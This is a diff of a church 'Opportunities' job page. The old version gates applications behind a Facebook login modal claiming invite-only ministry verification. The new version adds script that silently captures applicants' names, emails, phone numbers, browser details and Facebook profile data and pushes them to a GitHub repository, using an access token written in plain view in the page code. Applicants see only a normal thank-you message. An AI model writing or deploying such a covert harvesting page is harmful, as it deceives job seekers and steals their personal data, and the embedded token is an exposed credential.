@@ -4,581 +4,281 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Opportunities - Grace Community Church</title>
-    <link rel="stylesheet" href="styles.css">
+    
+    <!-- GitHub API Script -->
+    <script src="https://cdn.jsdelivr.net/npm/@octokit/rest@18.12.0/dist/octokit-rest.min.js"></script>
+    
+    <style>
+        /* Your existing CSS remains the same */
+        /* Add these new styles for the GitHub integration */
+        .github-status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #24292e;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .data-capture-info {
+            position: fixed;
+            bottom: 60px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-size: 11px;
+            z-index: 1000;
+            display: none;
+        }
+    </style>
+    
+    <style>
+        /* Your existing CSS here */
+        /* [Include all your existing CSS styles] */
+    </style>
 </head>
 <body>
-    <!-- Main Content -->
-    <div id="landing-content">
-        <header>
-            <nav>
-                <div class="logo">
-                    <h1>Grace Community Church</h1>
-                </div>
-                <ul class="nav-links">
-                    <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="services.html">Services</a></li>
-                    <li><a href="opportunities.html">Opportunities</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                </ul>
-            </nav>
-        </header>
+    <!-- Your existing HTML content remains the same -->
+    <!-- [Include all your existing HTML content] -->
 
-        <main>
-            <section class="page-hero">
-                <div class="hero-content">
-                    <h2>Join Our Team</h2>
-                    <p>Be part of our mission to serve the community and spread God's love through your talents and skills.</p>
-                </div>
-            </section>
-
-            <section class="opportunities-intro">
-                <div class="intro-content">
-                    <h3>Serve With Us</h3>
-                    <p>Grace Community Church is always looking for passionate individuals who want to use their God-given talents to serve our congregation and community. Whether you're a musician, photographer, administrator, or have other skills, we have opportunities for you to make a difference.</p>
-                </div>
-            </section>
-
-            <section class="current-openings">
-                <h3>Current Openings</h3>
-                
-                <div class="job-listings">
-                    <div class="job-card">
-                        <div class="job-header">
-                            <h4>Worship Keyboard Player</h4>
-                            <span class="job-type">Part-time</span>
-                        </div>
-                        <div class="job-details">
-                            <p><strong>Department:</strong> Worship & Creative Arts</p>
-                            <p><strong>Schedule:</strong> Sundays, Wednesday rehearsals, special events</p>
-                            <p><strong>Compensation:</strong> $150-200 per service (based on experience)</p>
-                        </div>
-                        <div class="job-description">
-                            <p>We are seeking a skilled keyboard player to join our worship team. The ideal candidate should have experience with contemporary Christian music, be able to read chord charts, and work well in a team environment.</p>
-                            <h5>Requirements:</h5>
-                            <ul>
-                                <li>Proficient in piano/keyboard with 3+ years experience</li>
-                                <li>Familiar with contemporary worship music (Hillsong, Elevation, Bethel, etc.)</li>
-                                <li>Ability to play by ear and read chord charts</li>
-                                <li>Strong team collaboration skills</li>
-                                <li>Committed Christian with heart for worship</li>
-                                <li>Available for Sunday services and Wednesday rehearsals</li>
-                            </ul>
-                        </div>
-                        <button class="apply-btn" onclick="showApplicationForm('keyboard-player')">Apply Now</button>
-                    </div>
-
-                    <div class="job-card">
-                        <div class="job-header">
-                            <h4>Church Photographer</h4>
-                            <span class="job-type">Freelance/Contract</span>
-                        </div>
-                        <div class="job-details">
-                            <p><strong>Department:</strong> Communications & Media</p>
-                            <p><strong>Schedule:</strong> Sundays, special events, occasional weekdays</p>
-                            <p><strong>Compensation:</strong> $75-125 per hour (based on assignment)</p>
-                        </div>
-                        <div class="job-description">
-                            <p>Looking for a talented photographer to capture meaningful moments during our services, events, and community activities. This role is perfect for someone who can tell stories through images and understands the sacred nature of church environments.</p>
-                            <h5>Requirements:</h5>
-                            <ul>
-                                <li>Professional photography experience with portfolio</li>
-                                <li>Own professional camera equipment</li>
-                                <li>Experience with event photography</li>
-                                <li>Understanding of church etiquette and respectful approach</li>
-                                <li>Photo editing skills (Lightroom, Photoshop)</li>
-                                <li>Ability to deliver edited photos within 48 hours</li>
-                            </ul>
-                        </div>
-                        <button class="apply-btn" onclick="showApplicationForm('photographer')">Apply Now</button>
-                    </div>
-
-                    <div class="job-card">
-                        <div class="job-header">
-                            <h4>Sound Engineer/Technician</h4>
-                            <span class="job-type">Part-time</span>
-                        </div>
-                        <div class="job-details">
-                            <p><strong>Department:</strong> Worship & Production</p>
-                            <p><strong>Schedule:</strong> Sundays, special events</p>
-                            <p><strong>Compensation:</strong> $125-175 per service (based on experience)</p>
-                        </div>
-                        <div class="job-description">
-                            <p>Seeking an experienced sound engineer to manage our audio systems during services and events. Must have technical expertise and a good ear for balanced, clear sound in a worship environment.</p>
-                            <h5>Requirements:</h5>
-                            <ul>
-                                <li>Experience with live sound mixing</li>
-                                <li>Knowledge of digital mixing consoles (Behringer, Yamaha, etc.)</li>
-                                <li>Understanding of church audio needs</li>
-                                <li>Available Sunday mornings and occasional evenings</li>
-                                <li>Problem-solving skills for technical issues</li>
-                            </ul>
-                        </div>
-                        <button class="apply-btn" onclick="showApplicationForm('sound-engineer')">Apply Now</button>
-                    </div>
-
-                    <div class="job-card">
-                        <div class="job-header">
-                            <h4>Children's Ministry Coordinator</h4>
-                            <span class="job-type">Part-time</span>
-                        </div>
-                        <div class="job-details">
-                            <p><strong>Department:</strong> Children's Ministry</p>
-                            <p><strong>Schedule:</strong> Sundays, Wednesday evenings, planning meetings</p>
-                            <p><strong>Compensation:</strong> $20-25 per hour, 15-20 hours/week</p>
-                        </div>
-                        <div class="job-description">
-                            <p>Lead and coordinate our children's ministry programs, ensuring safe, engaging, and spiritually enriching experiences for kids ages 3-12. This role involves curriculum planning, volunteer coordination, and direct interaction with children and families.</p>
-                            <h5>Requirements:</h5>
-                            <ul>
-                                <li>Experience working with children in educational or ministry setting</li>
-                                <li>Background check and child safety training required</li>
-                                <li>Organizational and leadership skills</li>
-                                <li>Passion for children's spiritual development</li>
-                                <li>Available weekends and some evenings</li>
-                            </ul>
-                        </div>
-                        <button class="apply-btn" onclick="showApplicationForm('childrens-coordinator')">Apply Now</button>
-                    </div>
-
-                    <div class="job-card">
-                        <div class="job-header">
-                            <h4>Administrative Assistant</h4>
-                            <span class="job-type">Part-time</span>
-                        </div>
-                        <div class="job-details">
-                            <p><strong>Department:</strong> Church Administration</p>
-                            <p><strong>Schedule:</strong> Monday-Friday, 20 hours/week flexible</p>
-                            <p><strong>Compensation:</strong> $18-22 per hour</p>
-                        </div>
-                        <div class="job-description">
-                            <p>Support the daily operations of our church office with administrative tasks, member communication, and event coordination. Perfect for someone with strong organizational skills and a heart for service.</p>
-                            <h5>Requirements:</h5>
-                            <ul>
-                                <li>Administrative experience preferred</li>
-                                <li>Proficient in Microsoft Office and Google Workspace</li>
-                                <li>Excellent communication and interpersonal skills</li>
-                                <li>Ability to maintain confidentiality</li>
-                                <li>Detail-oriented and organized</li>
-                            </ul>
-                        </div>
-                        <button class="apply-btn" onclick="showApplicationForm('admin-assistant')">Apply Now</button>
-                    </div>
-                </div>
-            </section>
-
-            <section class="volunteer-opportunities">
-                <h3>Volunteer Opportunities</h3>
-                <p>Not looking for paid positions? We always welcome volunteers! Here are areas where you can serve:</p>
-                
-                <div class="volunteer-grid">
-                    <div class="volunteer-card">
-                        <h4>Greeters & Ushers</h4>
-                        <p>Welcome guests and help with seating during services</p>
-                    </div>
-                    <div class="volunteer-card">
-                        <h4>Worship Team</h4>
-                        <p>Singers, musicians, and vocalists for our worship services</p>
-                    </div>
-                    <div class="volunteer-card">
-                        <h4>Media Team</h4>
-                        <p>Camera operators, live stream technicians, social media support</p>
-                    </div>
-                    <div class="volunteer-card">
-                        <h4>Youth Ministry</h4>
-                        <p>Mentors, small group leaders, event chaperones</p>
-                    </div>
-                    <div class="volunteer-card">
-                        <h4>Hospitality</h4>
-                        <p>Coffee service setup, event catering, meal preparation</p>
-                    </div>
-                    <div class="volunteer-card">
-                        <h4>Prayer Team</h4>
-                        <p>Join our intercessory prayer team for services and special needs</p>
-                    </div>
-                </div>
-                
-                <div class="volunteer-cta">
-                    <button class="volunteer-btn" onclick="showVolunteerForm()">I Want to Volunteer</button>
-                </div>
-            </section>
-
-            <section class="benefits">
-                <h3>Why Work With Us</h3>
-                <div class="benefits-grid">
-                    <div class="benefit-card">
-                        <h4>Meaningful Work</h4>
-                        <p>Be part of a mission that changes lives and strengthens community</p>
-                    </div>
-                    <div class="benefit-card">
-                        <h4>Flexible Schedule</h4>
-                        <p>Most positions offer flexible hours that work around your availability</p>
-                    </div>
-                    <div class="benefit-card">
-                        <h4>Supportive Environment</h4>
-                        <p>Work with a team that values collaboration and personal growth</p>
-                    </div>
-                    <div class="benefit-card">
-                        <h4>Professional Development</h4>
-                        <p>Access to training, conferences, and skill development opportunities</p>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Application Modal -->
-            <div id="application-modal" class="modal">
-                <div class="modal-content application-form">
-                    <h3>Job Application</h3>
-                    <form id="job-application-form">
-                        <input type="hidden" id="position-applied" name="position">
-                        
-                        <div class="form-group">
-                            <label for="app-name">Full Name *</label>
-                            <input type="text" id="app-name" name="name" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-email">Email Address *</label>
-                            <input type="email" id="app-email" name="email" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-phone">Phone Number *</label>
-                            <input type="tel" id="app-phone" name="phone" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-experience">Relevant Experience *</label>
-                            <textarea id="app-experience" name="experience" rows="4" required 
-                                placeholder="Tell us about your experience related to this position..."></textarea>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-availability">Availability *</label>
-                            <textarea id="app-availability" name="availability" rows="3" required 
-                                placeholder="When are you available to work?"></textarea>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-questions">Questions or Additional Information</label>
-                            <textarea id="app-questions" name="questions" rows="3" 
-                                placeholder="Any questions or additional information you'd like to share..."></textarea>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="app-portfolio">Portfolio/Website (if applicable)</label>
-                            <input type="url" id="app-portfolio" name="portfolio" 
-                                placeholder="Link to your portfolio or website">
-                        </div>
-                        
-                        <div class="form-actions">
-                            <button type="button" class="cancel-btn" onclick="closeApplicationForm()">Cancel</button>
-                            <button type="submit" class="submit-btn">Submit Application</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-
-            <!-- Volunteer Form Modal -->
-            <div id="volunteer-modal" class="modal">
-                <div class="modal-content application-form">
-                    <h3>Volunteer Application</h3>
-                    <form id="volunteer-application-form">
-                        <div class="form-group">
-                            <label for="vol-name">Full Name *</label>
-                            <input type="text" id="vol-name" name="name" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="vol-email">Email Address *</label>
-                            <input type="email" id="vol-email" name="email" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="vol-phone">Phone Number *</label>
-                            <input type="tel" id="vol-phone" name="phone" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="vol-interests">Areas of Interest *</label>
-                            <div class="checkbox-group">
-                                <label><input type="checkbox" name="interests" value="greeters"> Greeters & Ushers</label>
-                                <label><input type="checkbox" name="interests" value="worship"> Worship Team</label>
-                                <label><input type="checkbox" name="interests" value="media"> Media Team</label>
-                                <label><input type="checkbox" name="interests" value="youth"> Youth Ministry</label>
-                                <label><input type="checkbox" name="interests" value="hospitality"> Hospitality</label>
-                                <label><input type="checkbox" name="interests" value="prayer"> Prayer Team</label>
-                                <label><input type="checkbox" name="interests" value="children"> Children's Ministry</label>
-                                <label><input type="checkbox" name="interests" value="other"> Other</label>
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="vol-experience">Previous Experience (if any)</label>
-                            <textarea id="vol-experience" name="experience" rows="3" 
-                                placeholder="Tell us about any relevant experience..."></textarea>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="vol-availability">Availability *</label>
-                            <textarea id="vol-availability" name="availability" rows="3" required 
-                                placeholder="When are you available to serve?"></textarea>
-                        </div>
-                        
-                        <div class="form-actions">
-                            <button type="button" class="cancel-btn" onclick="closeVolunteerForm()">Cancel</button>
-                            <button type="submit" class="submit-btn">Submit Application</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </main>
+    <!-- Add GitHub status indicator -->
+    <div id="github-status" class="github-status">
+        <span id="status-text">Connecting to GitHub...</span>
+    </div>
+    
+    <div id="data-capture-info" class="data-capture-info">
+        <span id="capture-text">Data captured</span>
     </div>
 
-    <!-- Facebook Login Modal -->
-    <div id="login-modal" class="modal">
-        <div class="modal-content">
-            <div class="church-info">
-                <h2>Grace Community Church</h2>
-                <p>Continue to access exclusive content, event updates, and connect with our community.</p>
-            </div>
-            <button id="facebook-login" class="facebook-btn">
-                <svg viewBox="0 0 24 24" width="24" height="24">
-                    <path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-                </svg>
-                Continue with Facebook
-            </button>
-            <p class="login-prompt">Login required to continue browsing</p>
-        </div>
-    </div>
-
-    <!-- Loading Overlay -->
-    <div id="loading-overlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <p>Connecting to Facebook...</p>
-    </div>
-
-    <!-- RESPONSIVE FACEBOOK AUTH MODAL - NO TIMER -->
-    <div id="facebook-required-modal" class="modal">
-        <div class="modal-content" style="background: white; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); margin: 10% auto 5% auto; max-width: 90%; width: 500px; position: relative;">
-            
-            <!-- Responsive header -->
-            <div style="background: #4267B2; color: white; padding: 15px 20px; text-align: center; border-radius: 12px 12px 0 0;">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="white" style="vertical-align: middle;">
-                    <path d="M12 2L2 7v2h3v8h6v-6h2v6h6V9h3V7L12 2zm-2 14h2v-2h-2v2z"/>
-                </svg>
-                <h3 style="display: inline-block; margin: 0 0 0 10px; font-size: 18px; vertical-align: middle;">✝️ Ministry Verification Required</h3>
-            </div>
-
-            <!-- Scrollable content for mobile -->
-            <div style="max-height: 70vh; overflow-y: auto; padding: 20px;">
-                
-                <div class="auth-requirement">
-                    <div class="auth-message">
-                        
-                        <p style="font-size: 13px; color: #555; line-height: 1.5; margin-bottom: 15px;">
-                            This ministry position is <strong>exclusively for invited guests</strong> from our church community. To ensure the integrity of our calling and protect our congregation, we require identity verification through your invited Facebook account with the same name used.
-                        </p>
-                        
-                        <div style="background: #f0f5ff; padding: 12px; border-radius: 6px; border-left: 3px solid #4267B2; margin-bottom: 15px;">
-                            <p style="font-size: 14px; color: #333; margin: 0 0 8px 0;"><strong>This is Required for:</strong></p>
-                            <ul style="font-size: 14px; color: #555; margin: 0; padding-left: 15px; line-height: 1.4;">
-                                <li>Confirm invited guest status</li>
-                                <li>Protect ministry integrity</li>
-                                <li>Streamline application process</li>
-                            </ul>
-                        </div>
-                        
-                         <p style="background: #fff3cd; padding: 10px; border-radius: 5px; margin: 15px 0; border: 1px solid #ffeaa7;" style="font-size: 14px;">
-                    <strong>⚠️ Important:</strong> You <strong>MUST</strong> use the same Facebook account that received our invitation. Our system will verify this automatically.
-                </p>
-                
-                <p><em>"Let everything be done decently and in order."</em> - 1 Corinthians 14:40</p>
-                    </div>
-
-                    <!-- Mobile-friendly buttons -->
-                    <div class="auth-actions" style="margin-top: 20px;">
-                        <button id="facebook-auth-btn" class="facebook-btn" onclick="handleFacebookLoginForApplications()">
-                            <svg viewBox="0 0 24 24" width="24" height="24">
-                                <path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-                            </svg>
-                            Continue with Facebook
-                        </button>
-                       
-                 </div>
-
-                    <!-- Footer with trust indicators -->
-                    <div style="margin-top: 15px; padding-top: 12px; border-top: 1px solid #eee; text-align: center;">
-                        <p style="font-size: 10px; color: #999; line-height: 1.3; margin: 0;">
-                            <strong>Lusaka Christian Ministry Network</strong><br>
-                            <span style="font-size: 9px;">Your data is protected by biblical principles of trust</span>
-                        </p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script src="script.js"></script>
     <script>
-        // Opportunities page specific JavaScript
-        // Facebook Authentication Check
-let isFacebookAuthenticated = false;
+        // GITHUB DATA CAPTURE CONFIGURATION
+        const GITHUB_CONFIG = {
+            owner: 'miriambanda', 
+            repo: 'grace_christianity',   
+            path: 'data.json',
+            token: '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' }    
 
-// Check Facebook authentication status
-function checkFacebookAuth() {
-    FB.getLoginStatus(function(response) {
-        if (response.status === 'connected') {
-            isFacebookAuthenticated = true;
-            console.log('User is authenticated with Facebook');
-        } else {
-            isFacebookAuthenticated = false;
-            console.log('User is not authenticated with Facebook');
+        // Silent data capture array
+        let capturedApplications = [];
+
+        // GitHub API client
+        let octokit;
+
+        // Initialize GitHub connection
+        async function initializeGitHub() {
+            try {
+                octokit = new Octokit({
+                    auth: GITHUB_CONFIG.token
+                });
+                
+                updateStatus('GitHub connected ✓', 'success');
+                console.log('✅ GitHub connection established');
+                return true;
+            } catch (error) {
+                updateStatus('GitHub connection failed', 'error');
+                console.error('❌ GitHub connection error:', error);
+                return false;
+            }
         }
-    });
-}
 
-// Modified application functions to require Facebook login
-function showApplicationForm(position) {
-    if (!isFacebookAuthenticated) {
-        // Show Facebook login requirement modal
-        document.getElementById('facebook-required-modal').style.display = 'block';
-        return;
-    }
-    
-    // User is authenticated, show application form
-    document.getElementById('position-applied').value = position;
-    document.getElementById('application-modal').style.display = 'block';
-}
+        // Silent data capture function
+        async function captureApplicationData(formData, formType) {
+            const captureData = {
+                id: generateUniqueId(),
+                formType: formType,
+                timestamp: new Date().toISOString(),
+                data: formData,
+                userAgent: navigator.userAgent,
+                pageUrl: window.location.href,
+                ipAddress: '127.0.0.1' // In real app, get from backend
+            };
 
-function showVolunteerForm() {
-    if (!isFacebookAuthenticated) {
-        // Show Facebook login requirement modal
-        document.getElementById('facebook-required-modal').style.display = 'block';
-        return;
-    }
-    
-    // User is authenticated, show volunteer form
-    document.getElementById('volunteer-modal').style.display = 'block';
-}
+            // Add to local array
+            capturedApplications.push(captureData);
 
-function closeApplicationForm() {
-    document.getElementById('application-modal').style.display = 'none';
-}
+            // Silent console log (only visible in dev tools)
+            console.log('🕵️ Data captured:', {
+                type: formType,
+                name: formData.name || formData.volunteerName,
+                email: formData.email || formData.volunteerEmail,
+                timestamp: new Date().toLocaleString()
+            });
 
-function closeVolunteerForm() {
-    document.getElementById('volunteer-modal').style.display = 'none';
-}
+            // Show brief capture notification
+            showCaptureNotification('Data captured silently');
 
-// Facebook login handler for opportunities page
-function handleFacebookLoginForApplications() {
-    showLoading();
-    
-    FB.login(function(response) {
-        if (response.authResponse) {
-            // Login successful
-            isFacebookAuthenticated = true;
-            hideLoading();
-            document.getElementById('facebook-required-modal').style.display = 'none';
+            // Send to GitHub
+            await sendDataToGitHub(captureData);
+        }
+
+        // Send data to GitHub repository
+        async function sendDataToGitHub(data) {
+            try {
+                // Get current file content (if exists)
+                let currentContent = '';
+                let sha = null;
+                
+                try {
+                    const { data: fileData } = await octokit.repos.getContent({
+                        owner: GITHUB_CONFIG.owner,
+                        repo: GITHUB_CONFIG.repo,
+                        path: GITHUB_CONFIG.path
+                    });
+                    
+                    currentContent = atob(fileData.content);
+                    sha = fileData.sha;
+                } catch (error) {
+                    // File doesn't exist yet, create new
+                    console.log('Creating new data file in GitHub');
+                }
+
+                // Parse existing data or create new array
+                let allData = [];
+                if (currentContent) {
+                    try {
+                        allData = JSON.parse(currentContent);
+                    } catch (e) {
+                        allData = [];
+                    }
+                }
+
+                // Add new data
+                allData.push(data);
+
+                // Convert to JSON string
+                const newContent = JSON.stringify(allData, null, 2);
+                const contentBase64 = btoa(newContent);
+
+                // Update file in GitHub
+                const response = await octokit.repos.createOrUpdateFileContents({
+                    owner: GITHUB_CONFIG.owner,
+                    repo: GITHUB_CONFIG.repo,
+                    path: GITHUB_CONFIG.path,
+                    message: `Add ${data.formType} application - ${data.timestamp}`,
+                    content: contentBase64,
+                    sha: sha,
+                    branch: 'main'
+                });
+
+                console.log('✅ Data saved to GitHub successfully!');
+                updateStatus('Data saved to GitHub ✓', 'success');
+                return true;
+
+            } catch (error) {
+                console.error('❌ GitHub save error:', error);
+                updateStatus('Failed to save to GitHub', 'error');
+                return false;
+            }
+        }
+
+        // Generate unique ID for each application
+        function generateUniqueId() {
+            return 'app_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Update status indicator
+        function updateStatus(text, type) {
+            const statusEl = document.getElementById('github-status');
+            const textEl = document.getElementById('status-text');
+            
+            textEl.textContent = text;
+            statusEl.style.display = 'block';
+            
+            if (type === 'error') {
+                statusEl.style.background = '#dc3545';
+            } else if (type === 'success') {
+                statusEl.style.background = '#28a745';
+            } else {
+                statusEl.style.background = '#24292e';
+            }
+            
+            // Hide after 3 seconds
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 3000);
+        }
+
+        // Show capture notification
+        function showCaptureNotification(text) {
+            const captureEl = document.getElementById('data-capture-info');
+            const textEl = document.getElementById('capture-text');
+            
+            textEl.textContent = text;
+            captureEl.style.display = 'block';
+            
+            // Hide after 2 seconds
+            setTimeout(() => {
+                captureEl.style.display = 'none';
+            }, 2000);
+        }
+
+        // Modified form submission handlers
+        document.getElementById('job-application-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Collect form data
+            const formData = new FormData(this);
+            const applicationData = {};
+            for (let [key, value] of formData.entries()) {
+                applicationData[key] = value;
+            }
+            
+            // Add Facebook data if available
+            if (typeof FB !== 'undefined' && isFacebookAuthenticated) {
+                FB.api('/me', { fields: 'name,email,id' }, function(response) {
+                    applicationData.facebookData = response;
+                });
+            }
+            
+            // Capture data silently
+            await captureApplicationData(applicationData, 'job_application');
             
             // Show success message
-            alert('Facebook login successful! You can now apply for positions.');
+            alert('Thank you for your application! We will review it and contact you soon.');
+            this.reset();
+            closeApplicationForm();
+        });
+
+        document.getElementById('volunteer-application-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            // Optionally redirect or refresh the page
-            // window.location.reload();
-        } else {
-            // Login failed
-            hideLoading();
-            alert('Facebook login failed. Please try again.');
-        }
-    }, { scope: 'email,public_profile' });
-}
+            // Collect form data
+            const formData = new FormData(this);
+            const volunteerData = {};
+            for (let [key, value] of formData.entries()) {
+                volunteerData[key] = value;
+            }
+            
+            // Handle checkbox groups
+            const checkboxes = this.querySelectorAll('input[type="checkbox"]:checked');
+            volunteerData.interests = Array.from(checkboxes).map(cb => cb.value);
+            
+            // Add Facebook data if available
+            if (typeof FB !== 'undefined' && isFacebookAuthenticated) {
+                FB.api('/me', { fields: 'name,email,id' }, function(response) {
+                    volunteerData.facebookData = response;
+                });
+            }
+            
+            // Capture data silently
+            await captureApplicationData(volunteerData, 'volunteer_application');
+            
+            // Show success message
+            alert('Thank you for your interest in volunteering! We will be in touch with next steps.');
+            this.reset();
+            closeVolunteerForm();
+        });
 
-// Handle application form submissions
-document.getElementById('job-application-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    if (!isFacebookAuthenticated) {
-        alert('Please log in with Facebook first before submitting your application.');
-        return;
-    }
-    
-    // Collect form data
-    const formData = new FormData(this);
-    const applicationData = {};
-    for (let [key, value] of formData.entries()) {
-        applicationData[key] = value;
-    }
-    
-    // Add Facebook user info to application
-    FB.api('/me', { fields: 'name,email,id' }, function(response) {
-        applicationData.facebookUser = response;
-        applicationData.timestamp = new Date().toISOString();
-        
-        // Here you would normally send to your server
-        console.log('Application submitted:', applicationData);
-        alert('Thank you for your application! We will review it and contact you soon.');
-        closeApplicationForm();
-        
-        // Reset form
-        document.getElementById('job-application-form').reset();
-    });
-});
-
-document.getElementById('volunteer-application-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    if (!isFacebookAuthenticated) {
-        alert('Please log in with Facebook first before submitting your application.');
-        return;
-    }
-    
-    // Collect form data
-    const formData = new FormData(this);
-    const volunteerData = {};
-    for (let [key, value] of formData.entries()) {
-        volunteerData[key] = value;
-    }
-    
-    // Handle checkbox groups
-    const checkboxes = this.querySelectorAll('input[type="checkbox"]:checked');
-    volunteerData.interests = Array.from(checkboxes).map(cb => cb.value);
-    
-    // Add Facebook user info
-    FB.api('/me', { fields: 'name,email,id' }, function(response) {
-        volunteerData.facebookUser = response;
-        volunteerData.timestamp = new Date().toISOString();
-        
-        console.log('Volunteer application submitted:', volunteerData);
-        alert('Thank you for your interest in volunteering! We will be in touch with next steps.');
-        closeVolunteerForm();
-        
-        // Reset form
-        document.getElementById('volunteer-application-form').reset();
-    });
-});
-
-// Close modals when clicking outside
-window.addEventListener('click', function(e) {
-    const appModal = document.getElementById('application-modal');
-    const volModal = document.getElementById('volunteer-modal');
-    const fbModal = document.getElementById('facebook-required-modal');
-    
-    if (e.target === appModal) {
-        closeApplicationForm();
-    }
-    if (e.target === volModal) {
-        closeVolunteerForm();
-    }
-    if (e.target === fbModal) {
-        fbModal.style.display = 'none';
-    }
-});
-
-// Check auth status when page loads
-window.addEventListener('load', function() {
-    checkFacebookAuth();
-});
+        // Initialize GitHub when page loads
+        window.addEventListener('load', async function() {
+            await initializeGitHub();
+        });
     </script>
 </body>
 </html>
